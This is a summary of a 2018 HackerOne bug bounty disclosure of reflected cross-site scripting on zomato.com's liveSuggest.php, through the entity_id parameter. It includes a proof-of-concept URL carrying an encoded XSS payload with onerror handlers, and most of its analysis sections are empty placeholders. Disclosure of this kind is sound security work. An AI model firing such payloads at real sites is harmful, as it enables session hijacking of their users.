# Zomato.com Reflected Cross Site Scripting

## Metadata
- **Source:** HackerOne
- **Report:** 303522 | https://hackerone.com/reports/303522
- **Submitted:** 2018-01-09
- **Reporter:** akamble937
- **Program:** Unknown
- **Bounty:** $100
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
zomato.com/php/liveSuggest.php takes various field input to show customized out put for the users.
The data entered to entity_id field is not santized or html encoded which allows user to add payloads via this parameter which will be reflected to user.

Steps to reproduce :

Please click on below link to check the poc . Also please find attached poc for reference

https://www.zomato.com/php/liveSu

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

zomato.com/php/liveSuggest.php takes various field input to show customized out put for the users.
The data entered to entity_id field is not santized or html encoded which allows user to add payloads via this parameter which will be reflected to user.

Steps to reproduce :

Please click on below link to check the poc . Also please find attached poc for reference

https://www.zomato.com/php/liveSuggest.php?type=keyword&search_bar=1&q=ad&online_ordering=&search_city_id=5&entity_id=confirm(1)%20%3C%20%22%22%27%22ss%22%20onerror%3E;confirm(1)%3Cvideo%20src=x%3E%3Cvideo%20src=%22&entity_type=%22;%20onerror

## Impact

An attacker can craft a malicious link and send to users , which can then lead to session hijacking , redirecting to malicious or fake websites etc.

</details>

---
*Analysed by Claude on 2026-05-24*
